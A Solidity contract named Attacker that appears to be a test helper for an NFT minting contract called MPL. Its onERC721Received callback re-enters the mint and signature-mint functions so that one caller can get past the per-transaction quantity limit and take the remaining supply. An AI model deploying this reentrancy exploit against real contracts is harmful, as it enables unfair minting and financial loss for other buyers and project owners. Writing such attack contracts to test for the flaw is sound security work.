//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "../MPL.sol";
import "@rari-capital/solmate/src/tokens/ERC721.sol";

contract Attacker {
  MPL public mpl;
  address public owner;

  bool public attacking;
  bool public viaMarsList;

  uint256 public index;
  bytes public signature;

  constructor(address _mplAddress, address _owner) {
    mpl = MPL(_mplAddress);
    owner = _owner;
  }


  function onERC721Received(
      address,
      address,
      uint256,
      bytes calldata
  ) public returns (bytes4) {

      if(msg.sender == address(mpl) && !attacking) {
        attacking = true;
        uint256 available = mpl.limit() - mpl.totalSupply();
        if(available > 0 && gasleft() > 220_000) {
          if(available > mpl.maxQuantity()) {
            if(viaMarsList) {
              mpl.mintWithSignature{value: mpl.maxQuantity() * mpl.price()}(mpl.maxQuantity(), index, signature);
              }
            else {
              mpl.mint{value: mpl.maxQuantity() * mpl.price()}(mpl.maxQuantity());
            }
          }
          else {
            if(viaMarsList) {
              mpl.mintWithSignature{value: available * mpl.price()}(available, index, signature);
            }
            else {
              mpl.mint{value: available * mpl.price()}(available);
            }
          }
        }
        attacking = false;
      }
      return ERC721TokenReceiver.onERC721Received.selector;
  }

  function attack() public {
    mpl.mint{value: mpl.price()}(1);
  }

  function attackWithSignature(uint256 _index, bytes memory _signature) public {
    index = _index;
    signature = _signature;
    viaMarsList = true;
    mpl.mintWithSignature{value: mpl.price()}(1, index, signature);
    viaMarsList = false;
  }

  function multiMint() public {
    mpl.mint{value: mpl.price()}(1);
    mpl.mint{value: mpl.price()}(1);
    mpl.mint{value: mpl.price()}(1);
  }

  receive() external payable {}

}
